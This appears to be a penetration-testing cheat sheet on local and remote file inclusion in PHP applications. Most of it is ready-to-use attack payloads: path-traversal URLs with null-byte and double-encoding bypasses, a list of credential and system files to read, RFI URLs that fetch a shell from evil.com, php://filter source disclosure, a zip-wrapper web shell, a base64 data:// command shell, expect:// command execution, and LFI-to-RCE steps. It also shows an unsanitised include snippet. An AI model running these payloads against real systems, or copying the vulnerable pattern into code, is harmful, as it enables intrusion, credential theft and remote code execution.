# Local File & Remote File Inclusion

The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a “dynamic file inclusion” mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.

Local file inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application. 

Remote File Inclusion (also known as RFI) is the process of including remote files through the exploiting of vulnerable inclusion procedures implemented in the application.

These vulnerabilities occur, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing a local file or external URL to be injected.

Although most examples point to vulnerable PHP scripts, we should keep in mind that it is also common in other technologies such as JSP, ASP and others.

[Testing for LFI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion.html)

[Testing for RFI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion.html)


## Vulnerable Code Examples:
PHP:
```
<?php
$page = $_GET[page];
include($page);
?>
```

## Double Encoding
This attack technique consists of encoding user request parameters twice in hexadecimal format in order to bypass security controls or cause unexpected behavior from the application. It’s possible because the webserver accepts and processes client requests in many encoded forms.

By using double encoding it’s possible to bypass security filters that only decode user input once. The second decoding process is executed by the backend platform or modules that properly handle encoded data, but don’t have the corresponding security checks in place.

[Read more here](https://owasp.org/www-community/Double_Encoding)

## Null Byte
In many operating systems, null bytes %00 can be injected to terminate the filename. For example, sending a parameter like `?file=secret.doc%00.pdf` will result in a Java application seeing a string that ends with “.pdf” and the operating system will see a file that ends in “.doc”. Attackers may use this trick to bypass validation routines.

## Basic LFI (Including Null Byte & Double Encoding)
```
http://example.com/index.php?page=etc/passwd
http://example.com/index.php?page=etc/passwd%00
http://example.com/index.php?page=../../etc/passwd
http://example.com/index.php?page=%252e%252e%252f
http://example.com/index.php?page=....//....//etc/passwd
```

Files to check out if LFI is working:
```
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
```

## Basic RFI (Including Null Byte & Double Encoding)
```
http://example.com/index.php?page=http://evil.com/shell.txt
http://example.com/index.php?page=http://evil.com/shell.txt%00
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

## LFI/RFI Wrappers

### LFI Wrapper rot13 and base64 via php://filter
```
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

Can be chained with a compression wrapper:
```
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

### LFI Wrapper ZIP
```
echo "</pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;   
mv payload.zip shell.jpg;    
rm payload.php   

http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

### RFI Wrapper DATA with "" payload
```
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```

### RFI Wrapper EXPECT
```
http://example.com/index.php?page=php:expect://id
http://example.com/index.php?page=php:expect://ls
```

### XSS with "" payload
```
http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
```

## LFI to RCE

### Via `/proc/*/fd`:
- Upload a lot of shells (for example : 100)
- Include `http://example.com/index.php?page=/proc/$PID/fd/$FD` with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)

### Via File Upload:
```
http://example.com/index.php?page=path/to/uploaded/file.png
```

